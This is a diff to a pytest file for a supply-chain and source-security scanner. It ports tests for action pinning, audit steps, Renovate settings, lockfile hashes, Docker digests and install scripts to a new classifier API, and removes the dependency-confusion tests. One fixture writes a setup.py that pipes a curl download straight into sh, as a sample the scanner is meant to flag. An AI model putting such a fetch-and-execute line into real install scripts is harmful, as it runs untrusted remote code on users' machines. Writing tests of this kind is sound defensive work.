@@ -2,7 +2,6 @@
 
 from pathlib import Path
 
-import analyzers.assess_supply_chain_controls as A
 import analyzers.mass_assignment_scanner as M
 import analyzers.source_auth_scanner as S
 import model.emit_sca_practice as E
@@ -151,80 +150,79 @@ def test_dto_does_not_collide_with_entity_in_another_package(tmp_path, typename)
     assert not M.scan_repo(tmp_path, M.load_catalog(ROOT / "data/mass-assignment-signatures.yaml"))
 
 
+def _workflow(tmp_path, body, name="ci.yml"):
+    path = tmp_path / ".github/workflows" / name
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(body)
+
+
 @pytest.mark.parametrize("revision", ["main", "develop"])
-def test_mutable_branch_alongside_pinned_action(revision):
-    text = "- uses: vendor/stable@" + "a" * 40 + f"\n- uses: vendor/tool@{revision}"
-    assert A._eval_action_pinning(text, None)["effectiveness"] == A.PARTIAL
+def test_mutable_branch_alongside_pinned_action(tmp_path, revision):
+    _workflow(tmp_path, "steps:\n  - uses: vendor/stable@" + "a" * 40 + f"\n  - uses: vendor/tool@{revision}\n")
+    assert E.classify_action_pinning(tmp_path)[0] == "Partial"
 
 
 @pytest.mark.parametrize("text", ["# npm audit\n", "# pip-audit\n"])
-def test_commented_audit_is_not_a_control(text):
-    assert A._eval_cve_scanning(text)["effectiveness"] == A.MISSING
+def test_commented_audit_is_not_a_control(tmp_path, text):
+    _workflow(tmp_path, "steps:\n  " + text)
+    assert E.classify_sca_scanning(tmp_path)[0] == E.NOT_EVIDENCED
 
 
 def test_job_level_advisory_audit_is_not_blocking(tmp_path):
-    p = tmp_path / ".github/workflows/audit.yml"
-    p.parent.mkdir(parents=True)
-    p.write_text("jobs:\n  audit:\n    continue-on-error: true\n    steps:\n      - run: npm audit\n")
-    assert A._eval_cve_scanning("", str(tmp_path))["effectiveness"] == A.WEAK
+    _workflow(
+        tmp_path, "jobs:\n  audit:\n    continue-on-error: true\n    steps:\n      - run: npm audit\n", "audit.yml"
+    )
+    assert E.classify_sca_scanning(tmp_path)[0] == "Weak"
 
 
 @pytest.mark.parametrize("name", ["renovate.json", ".renovaterc.json"])
 def test_disabled_renovate_is_not_credited(tmp_path, name):
     (tmp_path / "package.json").write_text("{}")
     (tmp_path / name).write_text('{"enabled": false}')
-    assert E.classify_auto_updates(tmp_path, tmp_path)[0] == "Missing"
-    assert A._eval_dep_management("", str(tmp_path))["effectiveness"] == A.MISSING
+    assert E.classify_auto_updates(tmp_path, tmp_path)[0] == E.NOT_EVIDENCED
 
 
 def test_explicit_renovate_manager_covers_npm(tmp_path):
     (tmp_path / "package.json").write_text("{}")
     (tmp_path / "renovate.json").write_text('{"enabledManagers": ["npm"]}')
-    assert A._eval_dep_management("", str(tmp_path))["effectiveness"] == A.ADEQUATE
+    assert E.classify_auto_updates(tmp_path, tmp_path)[0] == "Adequate"
 
 
 def test_partial_hash_file_is_not_full_integrity(tmp_path):
     (tmp_path / "requirements.txt").write_text("first==1 --hash=sha256:" + "a" * 64 + "\nsecond>=2\n")
-    assert A._eval_lockfile("", str(tmp_path))["effectiveness"] != A.ADEQUATE
+    assert E.classify_lockfile_hygiene(tmp_path)[0] != "Adequate"
 
 
 def test_mixed_ecosystem_lock_coverage(tmp_path):
     (tmp_path / "package.json").write_text("{}")
     (tmp_path / "package-lock.json").write_text("{}")
     (tmp_path / "requirements.txt").write_text("library>=1\n")
-    assert A._eval_lockfile("", str(tmp_path))["effectiveness"] == A.PARTIAL
+    assert E.classify_lockfile_hygiene(tmp_path)[0] == "Partial"
 
 
 @pytest.mark.parametrize("filename", ["requirements.txt", "requirements.lock"])
-def test_pip_hash_flag_is_sufficient(filename):
-    assert A._eval_ci_install(f"pip install --require-hashes -r {filename}")["effectiveness"] == A.ADEQUATE
+def test_pip_hash_flag_is_sufficient(tmp_path, filename):
+    _workflow(tmp_path, f"steps:\n  - run: pip install --require-hashes -r {filename}\n")
+    assert E.classify_ci_install(tmp_path)[0] == "Adequate"
 
 
 def test_docker_alias_is_local_to_file(tmp_path):
     (tmp_path / "Dockerfile").write_text("FROM alpine@sha256:" + "a" * 64 + " AS worker")
     (tmp_path / "Dockerfile.worker").write_text("FROM worker")
-    assert A._eval_container_hygiene("", str(tmp_path))["effectiveness"] == A.PARTIAL
+    assert E.classify_base_image_pinning(tmp_path)[0] == "Partial"
 
 
 @pytest.mark.parametrize("platform", ["linux/amd64", "linux/arm64"])
 def test_docker_platform_option_is_not_image(tmp_path, platform):
     (tmp_path / "Dockerfile").write_text(f"FROM --platform={platform} alpine@sha256:" + "a" * 64)
-    assert A._eval_container_hygiene("", str(tmp_path))["effectiveness"] == A.ADEQUATE
+    assert E.classify_base_image_pinning(tmp_path)[0] == "Adequate"
 
 
 def test_later_setup_execution_is_inspected(tmp_path):
     (tmp_path / "setup.py").write_text(
         'import os, subprocess\nsubprocess.run(["python", "--version"])\nos.system("curl https://example.invalid/setup.sh | sh")\n'
     )
-    assert A._eval_postinstall("", str(tmp_path))["effectiveness"] == A.MISSING
-
-
-@pytest.mark.parametrize("filename", ["requirements.txt", "requirements-dev.txt"])
-def test_requirements_index_options_are_inspected(tmp_path, filename):
-    (tmp_path / filename).write_text(
-        "--extra-index-url https://packages.internal.invalid/simple\nprivate-component==1\n"
-    )
-    assert A._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == A.WEAK
+    assert E.classify_install_scripts(tmp_path)[0] == "Missing"
 
 
 @pytest.mark.parametrize("mention", ["logger.info(req.body.resetToken);", 'const feature = "mfa";'])
@@ -239,23 +237,11 @@ def test_internal_source_symlink_retains_coverage(tmp_path):
     assert "AUTHZ-002" in source(tmp_path, "", "empty.js")
 
 
-def test_requirement_include_stays_inside_repository(tmp_path):
-    repo = tmp_path / "repo"
-    repo.mkdir()
-    outside = tmp_path / "private.in"
-    outside.write_text("--extra-index-url https://packages.internal.invalid/simple\n")
-    (repo / "requirements.txt").write_text("-r ../private.in\npublic-lib==1\n")
-    assert A._eval_dependency_confusion("", str(repo))["effectiveness"] != A.WEAK
-    (repo / "included.in").write_text(outside.read_text())
-    (repo / "requirements.txt").write_text("-r included.in\npublic-lib==1\n")
-    assert A._eval_dependency_confusion("", str(repo))["effectiveness"] == A.WEAK
-
-
 def test_fully_hashed_requirements_and_prior_docker_stage_stay_adequate(tmp_path):
     (tmp_path / "requirements.txt").write_text("public-lib==1 --hash=sha256:" + "a" * 64 + "\n")
-    assert A._eval_lockfile("", str(tmp_path))["effectiveness"] == A.ADEQUATE
+    assert E.classify_lockfile_hygiene(tmp_path)[0] == "Adequate"
     (tmp_path / "Dockerfile").write_text("FROM alpine@sha256:" + "a" * 64 + " AS builder\nFROM builder\n")
-    assert A._eval_container_hygiene("", str(tmp_path))["effectiveness"] == A.ADEQUATE
+    assert E.classify_base_image_pinning(tmp_path)[0] == "Adequate"
 
 
 @pytest.mark.parametrize("name", ["service.py", "nested/routes.ts"])
@@ -317,13 +303,3 @@ def test_optional_stronger_policy_does_not_hide_weak_minimum(tmp_path):
 def test_inline_model_calls_are_sanitized_per_occurrence(tmp_path):
     code = 'import { llm } from "./model";\npanel.innerHTML = DOMPurify.sanitize(await llm.invoke(prompt)) + await llm.invoke(otherPrompt);'
     assert "INJ-LLM-002" in source(tmp_path, code)
-
-
-@pytest.mark.parametrize("option", ["--extra-index-url=", "--extra-index-url "])
-def test_requirements_index_assignment_forms(tmp_path, option):
-    (tmp_path / "requirements.txt").write_text(option + "https://packages.internal.invalid/simple\n")
-    assert A._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == A.WEAK
-
-
-def test_malformed_index_url_does_not_crash():
-    assert not A._is_internal_index("https://[invalid")
